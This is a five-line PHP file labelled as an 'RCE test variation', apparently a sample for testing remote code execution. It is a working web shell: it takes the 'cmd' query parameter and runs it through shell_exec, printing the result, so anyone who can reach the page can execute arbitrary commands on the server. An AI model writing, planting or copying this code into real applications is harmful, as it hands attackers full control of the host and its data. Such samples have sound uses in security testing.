<?php
// RCE test variation #265
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>